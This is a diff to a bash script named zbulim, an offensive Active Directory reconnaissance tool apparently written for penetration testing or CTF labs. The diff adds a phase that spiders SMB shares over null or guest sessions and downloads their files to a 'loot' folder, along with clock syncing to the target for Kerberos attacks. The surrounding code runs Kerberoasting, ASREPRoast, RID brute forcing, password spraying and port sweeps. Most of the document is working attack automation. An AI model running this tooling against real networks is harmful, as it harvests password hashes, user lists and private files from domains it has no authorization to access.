@@ -150,20 +150,23 @@ usage() {
     echo -e "${BOLD}Options:${RESET}"
     echo "  -o, --output DIR   Directory for nmap results (default: ./nmap)"
     echo "  --skip-nmap        Skip all nmap scans (useful for re-runs)"
+    echo "  --skip-clock       Skip clock sync via ntpdate"
     echo "  -h, --help         Show this help message"
     echo
     echo -e "${BOLD}Phases:${RESET}"
     echo "  1. nxc smb     — host enum, null/guest auth, signing, shares, users"
-    echo "  2. RID brute   — enumerate users via RID cycling (smb + mssql)"
-    echo "  3. nxc ldap    — ASREPRoast, Kerberoast, delegation, pass policy"
-    echo "  4. Multi-proto — test null/guest on rdp, winrm, mssql, ftp, ssh, vnc"
-    echo "  5. Spray       — username-as-password spray"
-    echo "  6. TCP sweep   — full port scan, then targeted -sCV on open ports"
-    echo "  7. UDP sweep   — top-1000 scan, then targeted -sUCV (requires sudo)"
-    echo "  8. Summary     — consolidated findings"
+    echo "  2. Spider+     — download accessible share files to ./loot/"
+    echo "  3. RID brute   — enumerate users via RID cycling (smb + mssql)"
+    echo "  4. nxc ldap    — ASREPRoast, Kerberoast, delegation, pass policy"
+    echo "  5. Multi-proto — test null/guest on rdp, winrm, mssql, ftp, ssh, vnc"
+    echo "  6. Spray       — username-as-password spray"
+    echo "  7. TCP sweep   — full port scan, then targeted -sCV on open ports"
+    echo "  8. UDP sweep   — top-1000 scan, then targeted -sUCV (requires sudo)"
+    echo "  9. Summary     — consolidated findings"
     echo
     echo -e "${BOLD}Output:${RESET}"
     echo "  ./recon/           Recon results (users, shares, hashes, etc.)"
+    echo "  ./loot/            Downloaded share files (spider_plus)"
     echo "  ./nmap/            All nmap scan results (or custom -o dir)"
     echo
     echo -e "${BOLD}Examples:${RESET}"
@@ -189,11 +192,13 @@ elapsed() {
 TARGET=""
 OUTDIR="nmap"
 SKIP_NMAP=false
+SKIP_CLOCK=false
 
 while [[ $# -gt 0 ]]; do
     case "$1" in
         -h|--help) banner; usage ;;
         --skip-nmap) SKIP_NMAP=true; shift ;;
+        --skip-clock) SKIP_CLOCK=true; shift ;;
         -o|--output) OUTDIR="$2"; shift 2 ;;
         -*) fail "Unknown option: $1"; echo "Use -h for help."; exit 1 ;;
         *)
@@ -211,23 +216,57 @@ done
 
 START_TIME=$(date +%s)
 RECONDIR="recon"
+LOOTDIR="loot"
 TCP_PORTS=""
 UDP_PORTS=""
 NULL_AUTH=false
 GUEST_AUTH=false
+SHARES_SPIDERED=false
 DOMAIN=""
 HOSTNAME=""
 
 
 banner
+
+# ── Require sudo ──────────────────────────────────────────────────────────────
+if [[ $EUID -ne 0 ]]; then
+    fail "zbulim must run as root (sudo). Needed for clock sync, UDP scans, /etc/hosts."
+    info "Re-run with: ${BOLD}sudo zbulim ${*}${RESET}"
+    exit 1
+fi
+
 info "Target  : ${BOLD}${TARGET}${RESET}"
 info "Recon   : ${BOLD}${RECONDIR}/${RESET}"
 info "Nmap    : ${BOLD}${OUTDIR}/${RESET}"
-$SKIP_NMAP && info "Nmap    : ${BOLD}${YELLOW}SKIPPED${RESET}"
+$SKIP_NMAP  && info "Nmap    : ${BOLD}${YELLOW}SKIPPED${RESET}"
+$SKIP_CLOCK && info "Clock   : ${BOLD}${YELLOW}SKIPPED${RESET}"
 info "Started : $(date '+%Y-%m-%d %H:%M:%S')"
 
 mkdir -p "$OUTDIR" "$RECONDIR"
 chown "$REAL_USER:$REAL_GROUP" "$OUTDIR" "$RECONDIR" 2>/dev/null || true
+
+SPIDER_SRC="$HOME/.nxc/modules/nxc_spider_plus"
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# Clock Sync
+# ═══════════════════════════════════════════════════════════════════════════════
+if $SKIP_CLOCK; then
+    section "Clock Sync — SKIPPED (--skip-clock)"
+else
+    section "Clock Sync"
+    if command -v ntpdate &>/dev/null; then
+        info "Syncing clock with target (ntpdate)..."
+        if ntpdate -s "$TARGET" 2>/dev/null; then
+            success "Clock synced with ${BOLD}${TARGET}${RESET}"
+        else
+            warn "ntpdate failed — clock may be out of sync with DC."
+            info "Kerberos-based attacks may fail if clock skew > 5 minutes."
+        fi
+    else
+        warn "ntpdate not found — skipping clock sync."
+        info "Install with: ${BOLD}sudo apt install ntpdate${RESET}"
+    fi
+fi
 
 # ═══════════════════════════════════════════════════════════════════════════════
 # SMB Enumeration — nxc
@@ -341,10 +380,15 @@ else
 
         if $NULL_AUTH; then
             info "Enumerating shares via null session..."
-            nxc smb "$TARGET" -u '' -p '' --shares 2>&1 | safe_write "${RECONDIR}/shares-null.txt" || true
+            SHARES_OUT=$(nxc smb "$TARGET" -u '' -p '' --shares 2>&1) || true
+            echo "$SHARES_OUT" | safe_write "${RECONDIR}/shares-null.txt" || true
             if [[ -s "${RECONDIR}/shares-null.txt" ]]; then
                 SHARE_COUNT=$(grep -cP 'READ|WRITE' "${RECONDIR}/shares-null.txt" || true)
                 success "Found ${BOLD}${SHARE_COUNT}${RESET} accessible shares — saved to ${RECONDIR}/shares-null.txt"
+                echo "$SHARES_OUT" | sed 's/\x1b\[[0-9;]*m//g' | \
+                    sed 's/^SMB[[:space:]]\+[0-9.]\+[[:space:]]\+[0-9]\+[[:space:]]\+[A-Za-z0-9_-]\+[[:space:]]\+//' | \
+                    { grep -vP '^\[\*\]|^\[\+\]|^\[-\]|^$' || true; } | \
+                    while IFS= read -r line; do echo -e "  ${DIM}${line}${RESET}"; done
             fi
 
             info "Enumerating users via null session..."
@@ -357,7 +401,7 @@ else
                 # Show clean user table: strip nxc prefix, skip info lines, deduplicate
                 echo "$USERS_OUT" | sed 's/\x1b\[[0-9;]*m//g' | \
                     sed 's/^SMB[[:space:]]\+[0-9.]\+[[:space:]]\+[0-9]\+[[:space:]]\+[A-Za-z0-9_-]\+[[:space:]]\+//' | \
-                    grep -vP '^\[\*\]|^\[\+\]|^\[-\]|^$' | \
+                    { grep -vP '^\[\*\]|^\[\+\]|^\[-\]|^$' || true; } | \
                     awk '!seen[$0]++' | \
                     while IFS= read -r line; do echo -e "  ${DIM}${line}${RESET}"; done
                 merge_users "${RECONDIR}/users-null.txt"
@@ -368,10 +412,15 @@ else
 
         if $GUEST_AUTH; then
             info "Enumerating shares via guest login..."
-            nxc smb "$TARGET" -u 'guest' -p '' --shares 2>&1 | safe_write "${RECONDIR}/shares-guest.txt" || true
+            SHARES_OUT=$(nxc smb "$TARGET" -u 'guest' -p '' --shares 2>&1) || true
+            echo "$SHARES_OUT" | safe_write "${RECONDIR}/shares-guest.txt" || true
             if [[ -s "${RECONDIR}/shares-guest.txt" ]]; then
                 SHARE_COUNT=$(grep -cP 'READ|WRITE' "${RECONDIR}/shares-guest.txt" || true)
                 success "Found ${BOLD}${SHARE_COUNT}${RESET} accessible shares — saved to ${RECONDIR}/shares-guest.txt"
+                echo "$SHARES_OUT" | sed 's/\x1b\[[0-9;]*m//g' | \
+                    sed 's/^SMB[[:space:]]\+[0-9.]\+[[:space:]]\+[0-9]\+[[:space:]]\+[A-Za-z0-9_-]\+[[:space:]]\+//' | \
+                    { grep -vP '^\[\*\]|^\[\+\]|^\[-\]|^$' || true; } | \
+                    while IFS= read -r line; do echo -e "  ${DIM}${line}${RESET}"; done
             fi
 
             info "Enumerating users via guest login..."
@@ -383,7 +432,7 @@ else
                 success "Exported ${BOLD}${USER_COUNT}${RESET} users — saved to ${RECONDIR}/users-guest.txt"
                 echo "$USERS_OUT" | sed 's/\x1b\[[0-9;]*m//g' | \
                     sed 's/^SMB[[:space:]]\+[0-9.]\+[[:space:]]\+[0-9]\+[[:space:]]\+[A-Za-z0-9_-]\+[[:space:]]\+//' | \
-                    grep -vP '^\[\*\]|^\[\+\]|^\[-\]|^$' | \
+                    { grep -vP '^\[\*\]|^\[\+\]|^\[-\]|^$' || true; } | \
                     awk '!seen[$0]++' | \
                     while IFS= read -r line; do echo -e "  ${DIM}${line}${RESET}"; done
                 merge_users "${RECONDIR}/users-guest.txt"
@@ -391,6 +440,53 @@ else
                 warn "No users returned via guest login."
             fi
         fi
+    fi
+
+    # ── Spider + Download accessible shares ─────────────────────────────────
+    # Pick best auth: prefer guest (usually has more access), fallback to null
+    SPIDER_USER="" SPIDER_PASS="" SPIDER_AUTH=false
+    if $GUEST_AUTH; then
+        GUEST_SHARES=$(grep -cP 'READ' "${RECONDIR}/shares-guest.txt" 2>/dev/null || true)
+        if [[ "${GUEST_SHARES:-0}" -gt 0 ]]; then
+            SPIDER_USER="guest" SPIDER_PASS="" SPIDER_AUTH=true
+        fi
+    fi
+    if ! $SPIDER_AUTH && $NULL_AUTH; then
+        NULL_SHARES=$(grep -cP 'READ' "${RECONDIR}/shares-null.txt" 2>/dev/null || true)
+        if [[ "${NULL_SHARES:-0}" -gt 0 ]]; then
+            SPIDER_USER="" SPIDER_PASS="" SPIDER_AUTH=true
+        fi
+    fi
+
+    if $SPIDER_AUTH && ! $SHARES_SPIDERED; then
+        section "Share Download (spider_plus)"
+        info "Spidering and downloading accessible shares..."
+        SPIDER_OUT=$(nxc smb "$TARGET" -u "$SPIDER_USER" -p "$SPIDER_PASS" -M spider_plus -o "DOWNLOAD_FLAG=True" 2>&1) || true
+
+        # Copy downloaded files to ./loot/
+        if [[ -d "${SPIDER_SRC}/${TARGET}" ]]; then
+            mkdir -p "${LOOTDIR}"
+            cp -r "${SPIDER_SRC}/${TARGET}/." "${LOOTDIR}/" 2>/dev/null || true
+            # Also grab the JSON metadata
+            if [[ -f "${SPIDER_SRC}/${TARGET}.json" ]]; then
+                cp "${SPIDER_SRC}/${TARGET}.json" "${LOOTDIR}/spider_plus.json" 2>/dev/null || true
+            fi
+            chown -R "$REAL_USER:$REAL_GROUP" "${LOOTDIR}" 2>/dev/null || true
+
+            # Show what we got
+            LOOT_FILES=$(find "${LOOTDIR}" -type f ! -name 'spider_plus.json' 2>/dev/null | wc -l || true)
+            if [[ "$LOOT_FILES" -gt 0 ]]; then
+                success "Downloaded ${BOLD}${LOOT_FILES}${RESET} file(s) to ${LOOTDIR}/"
+                find "${LOOTDIR}" -type f ! -name 'spider_plus.json' -printf '  %P\n' 2>/dev/null | \
+                    while IFS= read -r f; do echo -e "  ${DIM}├─ ${f}${RESET}"; done
+            else
+                info "Spider completed but no files downloaded (may be empty shares)."
+                rmdir "${LOOTDIR}" 2>/dev/null || true
+            fi
+        else
+            info "No files downloaded by spider_plus."
+        fi
+        SHARES_SPIDERED=true
     fi
 
     # ── RID Brute Force ──────────────────────────────────────────────────────
@@ -487,11 +583,11 @@ else
     # ── Kerberoasting ─────────────────────────────────────────────────────────
     info "Testing Kerberoasting..."
     if $NULL_AUTH; then
-        KERB_OUT=$(nxc ldap "$TARGET" -u '' -p '' --kerberoasting "${RECONDIR}/kerberoast.txt" 2>&1) || true
+        KERB_OUT=$(nxc ldap "$TARGET" -u '' -p '' --kerberoasting "${RECONDIR}/kerberoast.txt" 2>&1 | tr -d '\0') || true
     elif $GUEST_AUTH; then
-        KERB_OUT=$(nxc ldap "$TARGET" -u 'guest' -p '' --kerberoasting "${RECONDIR}/kerberoast.txt" 2>&1) || true
+        KERB_OUT=$(nxc ldap "$TARGET" -u 'guest' -p '' --kerberoasting "${RECONDIR}/kerberoast.txt" 2>&1 | tr -d '\0') || true
     else
-        KERB_OUT=$(nxc ldap "$TARGET" -u '' -p '' --kerberoasting "${RECONDIR}/kerberoast.txt" 2>&1) || true
+        KERB_OUT=$(nxc ldap "$TARGET" -u '' -p '' --kerberoasting "${RECONDIR}/kerberoast.txt" 2>&1 | tr -d '\0') || true
     fi
     rm_if_empty "${RECONDIR}/kerberoast.txt"
     fix_owner "${RECONDIR}/kerberoast.txt"
@@ -533,9 +629,9 @@ else
     if $NULL_AUTH || $GUEST_AUTH; then
         info "Checking for delegation relationships..."
         if $NULL_AUTH; then
-            DELEG_OUT=$(nxc ldap "$TARGET" -u '' -p '' --find-delegation 2>&1) || true
+            DELEG_OUT=$(nxc ldap "$TARGET" -u '' -p '' --find-delegation 2>&1 | tr -d '\0') || true
         else
-            DELEG_OUT=$(nxc ldap "$TARGET" -u 'guest' -p '' --find-delegation 2>&1) || true
+            DELEG_OUT=$(nxc ldap "$TARGET" -u 'guest' -p '' --find-delegation 2>&1 | tr -d '\0') || true
         fi
         DELEG_STRIPPED=$(echo "$DELEG_OUT" | sed 's/\x1b\[[0-9;]*m//g')
         if echo "$DELEG_STRIPPED" | grep -qiP 'Unconstrained|Constrained|Resource'; then
@@ -547,9 +643,9 @@ else
 
         info "Checking for PASSWD_NOTREQD accounts..."
         if $NULL_AUTH; then
-            PWNR_OUT=$(nxc ldap "$TARGET" -u '' -p '' --password-not-required 2>&1) || true
+            PWNR_OUT=$(nxc ldap "$TARGET" -u '' -p '' --password-not-required 2>&1 | tr -d '\0') || true
         else
-            PWNR_OUT=$(nxc ldap "$TARGET" -u 'guest' -p '' --password-not-required 2>&1) || true
+            PWNR_OUT=$(nxc ldap "$TARGET" -u 'guest' -p '' --password-not-required 2>&1 | tr -d '\0') || true
         fi
         PWNR_STRIPPED=$(echo "$PWNR_OUT" | sed 's/\x1b\[[0-9;]*m//g')
         PWNR_ACTIVE=$(echo "$PWNR_STRIPPED" | grep -P 'User:' | grep -v -i 'disabled' || true)
@@ -562,9 +658,9 @@ else
 
         info "Checking for adminCount=1 users..."
         if $NULL_AUTH; then
-            ADMIN_OUT=$(nxc ldap "$TARGET" -u '' -p '' --admin-count 2>&1) || true
+            ADMIN_OUT=$(nxc ldap "$TARGET" -u '' -p '' --admin-count 2>&1 | tr -d '\0') || true
         else
-            ADMIN_OUT=$(nxc ldap "$TARGET" -u 'guest' -p '' --admin-count 2>&1) || true
+            ADMIN_OUT=$(nxc ldap "$TARGET" -u 'guest' -p '' --admin-count 2>&1 | tr -d '\0') || true
         fi
         ADMIN_STRIPPED=$(echo "$ADMIN_OUT" | sed 's/\x1b\[[0-9;]*m//g')
         if echo "$ADMIN_STRIPPED" | grep -qP 'adminCount=1|User:.*admin' -i; then
@@ -713,31 +809,25 @@ if $SKIP_NMAP; then
     fi
 else
     section "UDP — Full Port Sweep"
+    info "Running UDP scan (top 1000 ports)..."
 
-    if [[ $EUID -ne 0 ]]; then
-        warn "UDP scans require root — skipping."
-        info "Re-run with: ${BOLD}sudo zbulim ${TARGET} ${OUTDIR}${RESET}"
+    nmap -sU --min-rate 5000 --open -oA "${OUTDIR}/udp-allports" "$TARGET"
+    for f in "${OUTDIR}"/udp-allports.*; do fix_owner "$f"; done
+
+    UDP_PORTS=$(extract_open_ports "${OUTDIR}/udp-allports.gnmap" udp)
+
+    if [[ -z "$UDP_PORTS" ]]; then
+        warn "No open UDP ports found."
     else
-        info "Running UDP scan (ALL ports)..."
+        success "Open UDP ports: ${BOLD}${UDP_PORTS}${RESET}"
 
-        nmap -sU -p- --min-rate 5000 --open -oA "${OUTDIR}/udp-allports" "$TARGET"
-        for f in "${OUTDIR}"/udp-allports.*; do fix_owner "$f"; done
+        section "UDP — Targeted Version + Script Scan"
+        info "Running -sUCV on: ${UDP_PORTS}"
 
-        UDP_PORTS=$(extract_open_ports "${OUTDIR}/udp-allports.gnmap" udp)
+        nmap -p "$UDP_PORTS" -sUCV -oA "${OUTDIR}/udp-targeted" "$TARGET"
+        for f in "${OUTDIR}"/udp-targeted.*; do fix_owner "$f"; done
 
-        if [[ -z "$UDP_PORTS" ]]; then
-            warn "No open UDP ports found."
-        else
-            success "Open UDP ports: ${BOLD}${UDP_PORTS}${RESET}"
-
-            section "UDP — Targeted Version + Script Scan"
-            info "Running -sUCV on: ${UDP_PORTS}"
-
-            nmap -p "$UDP_PORTS" -sUCV -oA "${OUTDIR}/udp-targeted" "$TARGET"
-            for f in "${OUTDIR}"/udp-targeted.*; do fix_owner "$f"; done
-
-            success "UDP targeted scan complete."
-        fi
+        success "UDP targeted scan complete."
     fi
 fi
 
@@ -758,6 +848,7 @@ $NULL_AUTH  && echo -e "  ${DIM}Null Auth:${RESET} ${BOLD}${GREEN}Yes${RESET}"
 $GUEST_AUTH && echo -e "  ${DIM}Guest    :${RESET} ${BOLD}${GREEN}Yes${RESET}"
 [[ -s "${RECONDIR}/signing-off.txt" ]] && echo -e "  ${DIM}Signing  :${RESET} ${BOLD}${YELLOW}Not Required${RESET}"
 [[ -s "${RECONDIR}/users.txt" ]]       && echo -e "  ${DIM}Users    :${RESET} ${BOLD}$(wc -l < "${RECONDIR}/users.txt")${RESET} unique (${RECONDIR}/users.txt)"
+[[ -d "${LOOTDIR}" ]] && echo -e "  ${DIM}Loot     :${RESET} ${BOLD}$(find "${LOOTDIR}" -type f ! -name 'spider_plus.json' 2>/dev/null | wc -l)${RESET} file(s) in ${LOOTDIR}/"
 echo -e "  ${DIM}Elapsed  :${RESET} $(elapsed)"
 
 
@@ -771,5 +862,6 @@ for f in "${RECONDIR}/users.txt" "${RECONDIR}/shares-null.txt" "${RECONDIR}/shar
          "${RECONDIR}/users-ldap.txt" "${RECONDIR}/hosts"; do
     [[ -s "$f" ]] && echo -e "  ${DIM}├─${RESET} ${f} ${DIM}($(wc -l < "$f") lines)${RESET}"
 done
+[[ -d "${LOOTDIR}" ]] && echo -e "  ${DIM}├─${RESET} ${LOOTDIR}/ ${DIM}(downloaded share files)${RESET}"
 [[ -d "$OUTDIR" ]] && echo -e "  ${DIM}└─${RESET} ${OUTDIR}/ ${DIM}(nmap results)${RESET}"
 echo
